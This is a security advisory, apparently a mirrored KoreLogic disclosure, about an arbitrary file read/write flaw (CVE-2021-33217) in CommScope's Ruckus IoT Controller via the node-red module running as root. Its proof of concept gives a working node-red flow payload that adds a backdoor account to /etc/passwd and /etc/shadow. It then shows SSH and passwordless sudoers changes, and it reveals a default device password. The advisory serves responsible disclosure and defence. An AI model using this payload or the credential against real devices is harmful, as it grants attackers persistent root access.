@@ -1,0 +1,134 @@
+id: 36307
+date: 05/27/2021
+title: CommScope Ruckus IoT Controller 1.7.1.0 Web Application Arbitrary Read/Write Vulnerability
+author: Jim Becher
+cves: CVE-2021-33217
+
+CommScope Ruckus IoT Controller 1.7.1.0 Web Application Arbitrary Read/Write Vulnerability
+
+1. Vulnerability Details
+
+     Affected Vendor: CommScope
+     Affected Product: Ruckus IoT Controller
+     Affected Version: 1.7.1.0 and earlier
+     Platform: Linux
+     CWE Classification: CWE-250: Execution with Unnecessary Privileges
+     CVE ID: CVE-2021-33217
+
+
+2. Vulnerability Description
+
+     The IoT Controller web application includes a NodeJS module,
+     node-red, which has the capability for users to read or write to
+     local files on the IoT Controller. With the elevated privileges
+     the web application runs as, this allowed for reading and
+     writing to any file on the IoT Controller filesystem.
+
+
+3. Technical Description
+
+     The Ruckus IoT Controller contains the node-red NodeJS
+     Module. The node-red module has the built in functionality
+     to read and write to files on the local filesystem of the
+     IoT Controller.
+
+     An authentication token is required. But a token is easily
+     obtained due to hard-coded, default, unchangeable web application
+     credentials (CVE-2021-33219).
+
+     With the web application (and the node-red NodeJS module)
+     running as root, this functionality can be leveraged to
+     read or write to any file on the filesystem of the Ruckus
+     IoT Controller.
+
+     This condition was leveraged to add an account to the
+     /etc/passwd file, then used to add a password hash to
+     /etc/shadow. Additionally, the SSH daemon configuration was
+     modified to ensure that the newly added account would be able
+     to SSH in to the device. And to complete the escalation to
+     root-level privileges, the newly added account was added to
+     the /etc/sudoers configuration file.
+
+     None of these steps would have been possible if the web
+     application (and the node-red module as a result) had not been
+     running as the 'root' user.
+
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has released an updated firmware (1.8.0.0) which
+     remediates the described vulnerability. Firmware and release
+     notes are available at:
+
+     https://www.commscope.com/globalassets/digizuite/917216-faq-security-advisory-id-20210525-v1-0.pdf
+
+
+5. Credit
+
+     This vulnerability was discovered by Jim Becher (@jimbecher)
+     of KoreLogic, Inc.
+
+
+6. Disclosure Timeline
+
+     2021.03.30 - KoreLogic submits vulnerability details to
+                  CommScope.
+     2021.03.30 - CommScope acknowledges receipt and the intention
+                  to investigate.
+     2021.04.06 - CommScope notifies KoreLogic that this issue,
+                  along with several others reported by KoreLogic,
+                  will require more than the standard 45 business
+                  day remediation timeline.
+     2021.04.06 - KoreLogic agrees to extend disclosure embargo if
+                  necessary.
+     2021.04.30 - CommScope informs KoreLogic that remediation for
+                  this vulnerability will be available inside of the
+                  standard 45 business day timeline. Requests
+                  KoreLogic acquire CVE number for this
+                  vulnerability.
+     2021.05.14 - 30 business days have elapsed since the
+                  vulnerability was reported to CommScope.
+     2021.05.17 - CommScope notifies KoreLogic that the patched
+                  version of the firmware will be available the week
+                  of 2021.05.24.
+     2021.05.19 - KoreLogic requests CVE from MITRE.
+     2021.05.19 - MITRE issues CVE-2021-33217.
+     2021.05.25 - CommScope releases firmware 1.8.0.0 and associated
+                  advisory.
+     2021.05.26 - KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+     An excerpt of one of the POSTs, which is 16000+ bytes in length, is
+     below:
+
+     POST /node-red/flows HTTP/1.1
+     ....
+     ....
+    
+{"id":"b64c27d9.bde92","type":"debug","z":"9e8d5b92.105d48","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","x":410,"y":420,"wires":[]},{"id":"6a762f41.9154e","type":"file
+    
+in","z":"9e8d5b92.105d48","name":"","filename":"/etc/shadow","format":"lines","chunk":false,"sendError":false,"encoding":"none","x":240,"y":340,"wires":[["b64c27d9.bde92"]]},{"id":"9f4d3e63.679728","type":"file","z":"9e8d5b92.105d48","name":"","filename":"/etc/shadow","appendNewline":true,"createDir":false,"overwriteFile":"false","encoding":"ascii","x":300,"y":540,"wires":[[]]},{"id":"226919a8.efb196","type":"inject","z":"9e8d5b92.105d48","name":"","topic":"","payload":"jbecher2:$6$c4jEcmjj$uDjuSxfkzd0QHt/MAGnPJ798izuVhq11MSmkS3iXtDg.iqSumzou4.HauYOrSIYl5JdQlrbZAL7PAkPfrxcxH0:18626:0:99999:7:::","payloadType":"str","repeat":"","crontab":"","once":false,"onceDelay":0.1,"x":110,"y":500,"wires":[["9f4d3e63.679728"]]},{"id":"7b6a1a67.f44ef4","type":"inject","z":"9e8d5b92.105d48","name":"","topic":"jbecher2:x:18626:18626:Jim
+    
+Becher,,,:/tmp:/bin/bash","payload":"","payloadType":"str","repeat":"","crontab":"","once":false,"onceDelay":0.1,"x":110,"y":600,"wires":[["72dfbb2b.4e930c"]]},{"id":"72dfbb2b.4e930c","type":"file","z":"9e8d5b92.105d48","name":"","filename":"/etc/passwd","appendNewline":true,"createDir":false,"overwriteFile":"false","encoding":"ascii","x":320,"y":640,"wires":[[]]}],"rev":"0564d9f18d8097f549648378fe8c4476"}
+
+     and then there is a subsequent POST to inject/trigger the flow.
+
+     root@vriot:~# tail -1 /etc/passwd
+     jbecher2:x:18626:18626:Jim Becher,,,:/tmp:/bin/bash
+
+     root@vriot:~# tail -1 /etc/shadow
+    
+jbecher2:$6$c4jEcmjj$uDjuSxfkzd0QHt/MAGnPJ798izuVhq11MSmkS3iXtDg.iqSumzou4.HauYOrSIYl5JdQlrbZAL7PAkPfrxcxH0:18626:0:99999:7:::
+     Note: the above hash is the same as the hash of the vriotha user,
+     whose password is known to be 'nplus1user' (CVE-2021-33218).
+
+     root@vriot:~# tail -2 /etc/ssh/sshd_config
+     Match User jbecher2
+     PasswordAuthentication yes
+
+     root@vriot:~# tail -1 /etc/sudoers
+     jbecher2  ALL=(ALL:ALL) NOPASSWD: ALL
+
+#  0day.today [2023-03-26]  #
